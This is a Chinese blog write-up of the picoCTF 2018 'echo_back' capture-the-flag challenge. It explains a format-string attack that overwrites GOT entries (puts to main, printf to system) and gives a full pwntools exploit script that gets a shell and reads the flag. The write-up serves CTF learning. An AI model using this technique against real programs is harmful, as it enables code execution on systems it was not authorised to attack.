# picoctf_2018_echo_back



### 题目分析

简单的格式化字符串，修改`got@puts`为`main`函数地址制造循环即可：

- 先制造循环
- 修改`printf@got`为`system@plt`
- 输入`/bin/sh`获取`shell`

<!-- more -->

### 最终EXP

```python
from pwn import *

sh:tube = process('./PicoCTF_2018_echo_back')
cur_elf:ELF = all_parsed_args['cur_elf']

puts_got_addr = cur_elf.got['puts']
printf_got_addr = cur_elf.got['printf']
system_plt_addr = cur_elf.plt['system']
main_addr = cur_elf.sym['main']

context.arch = "i386"
payload = fmtstr_payload(offset=7, writes={puts_got_addr: main_addr}, write_size="short", write_size_max="short")

sh.recv()
sh.sendline(payload)

payload = fmtstr_payload(offset=7, writes={printf_got_addr: system_plt_addr}, write_size="short", write_size_max="short")
sh.recv()

sleep(2)

sh.sendline(payload)

sh.recv()

sleep(2)

# sh.sendline("/bin/sh")

sh.sendline('cat flag')

sh.interactive()
```

远程打：

![image-20210603000405650](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210603000405650.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)



---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-06-02-picoctf-2018-echo-back/  

